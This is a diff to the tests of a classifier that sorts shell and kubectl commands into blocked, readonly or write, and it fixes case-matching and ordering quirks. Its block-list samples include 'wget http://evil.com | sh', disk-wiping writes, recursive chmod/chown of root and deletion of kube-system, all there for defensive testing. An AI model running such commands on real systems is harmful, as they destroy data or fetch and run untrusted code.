@@ -43,9 +43,8 @@ class TestShellBlocked:
             "wget http://evil.com | sh",
             "> /dev/sda",
             "format c:",
-            # NOTE: chmod -R 777 / and chown -R / patterns have case mismatch
-            # (regex has -R but code lowercases input to -r), so they fall through
-            # to write instead of blocked. Tracked as known classification quirk.
+            "chmod -R 777 /",
+            "chown -R nobody /",
         ],
     )
     def test_blocked(self, cmd: str) -> None:
@@ -100,9 +99,7 @@ class TestShellReadonly:
             "find /tmp -name '*.log'",
             "which python",
             "file /bin/ls",
-            # NOTE: "stat /etc/passwd" and "cut ... /etc/passwd" match the broad
-            # "passwd" blocked pattern via re.search. Moved to blocked edge case tests.
-            "stat /tmp/file",
+            "stat /etc/passwd",
             "wc -l file.txt",
             "lsof -i :80",
             "ip addr",
@@ -114,7 +111,7 @@ class TestShellReadonly:
             "sysctl -a",
             "sort file.txt",
             "uniq file.txt",
-            "cut -d, -f1 file.txt",
+            "cut -d: -f1 /etc/passwd",
             "diff file1 file2",
             "ssh-add -l",
             "ssh-keygen -lf /path/key",
@@ -187,10 +184,10 @@ class TestShellWrite:
             "pip install flask",
             "npm install express",
             "crontab -e",
-            # NOTE: "ip link set", "ip addr add", "ip route add" are in SHELL_WRITE_COMMANDS
-            # but "ip" in SHELL_READONLY_COMMANDS matches first (prefix match).
-            # These classify as readonly due to evaluation order. Known quirk.
             "iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
+            "ip link set eth0 up",
+            "ip addr add 10.0.0.1/24 dev eth0",
+            "ip route add default via 10.0.0.1",
             "ssh-keygen -r hostname",
             "ssh-add -d /path/key",
             "ssh-add /path/key",
@@ -249,21 +246,26 @@ class TestShellEdgeCases:
         """rm -rf / should be blocked even though rm could be write."""
         assert classify_shell_command("rm -rf / ") == "blocked"
 
-    def test_passwd_pattern_broad_match(self) -> None:
-        """'passwd' regex is broad — matches anything containing 'passwd'."""
-        assert classify_shell_command("stat /etc/passwd") == "blocked"
-        assert classify_shell_command("cut -d: -f1 /etc/passwd") == "blocked"
+    def test_passwd_only_matches_command(self) -> None:
+        """'passwd' blocked pattern only matches the passwd command, not paths."""
+        assert classify_shell_command("passwd root") == "blocked"
+        assert classify_shell_command("stat /etc/passwd") == "readonly"
+        assert classify_shell_command("cut -d: -f1 /etc/passwd") == "readonly"
 
-    def test_case_mismatch_chmod_chown(self) -> None:
-        """Blocked patterns use -R uppercase but code lowercases input → falls to write."""
-        assert classify_shell_command("chmod -R 777 /") == "write"
-        assert classify_shell_command("chown -R nobody /") == "write"
+    def test_chmod_chown_recursive_root_blocked(self) -> None:
+        """chmod -R 777 / and chown -R ... / are blocked (case-insensitive)."""
+        assert classify_shell_command("chmod -R 777 /") == "blocked"
+        assert classify_shell_command("chmod -r 777 /") == "blocked"
+        assert classify_shell_command("chown -R nobody /") == "blocked"
+        assert classify_shell_command("chown -r nobody /") == "blocked"
 
-    def test_ip_readonly_shadows_ip_write(self) -> None:
-        """'ip' in readonly matches before 'ip link set'/'ip addr add' in write."""
-        assert classify_shell_command("ip link set eth0 up") == "readonly"
-        assert classify_shell_command("ip addr add 10.0.0.1/24 dev eth0") == "readonly"
-        assert classify_shell_command("ip route add default via 10.0.0.1") == "readonly"
+    def test_ip_write_overrides_ip_readonly(self) -> None:
+        """'ip link set'/'ip addr add'/'ip route add' are write, not readonly."""
+        assert classify_shell_command("ip link set eth0 up") == "write"
+        assert classify_shell_command("ip addr add 10.0.0.1/24 dev eth0") == "write"
+        assert classify_shell_command("ip route add default via 10.0.0.1") == "write"
+        # But plain 'ip addr' is still readonly
+        assert classify_shell_command("ip addr") == "readonly"
 
     def test_readonly_not_prefix_match_false_positive(self) -> None:
         """'ls' should match 'ls -la' but not 'lsmod' since lsmod != ls + space."""
@@ -285,8 +287,7 @@ class TestKubectlBlocked:
             "kubectl delete namespace kube-system",
             "kubectl delete ns kube-system",
             "kubectl delete --all --all-namespaces",
-            # NOTE: "delete --all -A" pattern has uppercase -A but code lowercases
-            # to -a, so it falls through to write. Known quirk.
+            "kubectl delete --all -A",
             "kubectl delete clusterrole admin",
             "kubectl delete clusterrolebinding admin",
             "delete crd --all",
@@ -415,9 +416,10 @@ class TestKubectlEdgeCases:
         assert classify_kubectl_command("GET pods") == "readonly"
         assert classify_kubectl_command("KUBECTL DELETE pod my-pod") == "write"
 
-    def test_case_mismatch_delete_all_A(self) -> None:
-        """Blocked pattern has -A uppercase but code lowercases → falls to write."""
-        assert classify_kubectl_command("kubectl delete --all -A") == "write"
+    def test_delete_all_A_blocked(self) -> None:
+        """'delete --all -A' is blocked (case-insensitive)."""
+        assert classify_kubectl_command("kubectl delete --all -A") == "blocked"
+        assert classify_kubectl_command("delete --all -a") == "blocked"
 
 
 # ── Pattern/Set Integrity ────────────────────────────────────────────
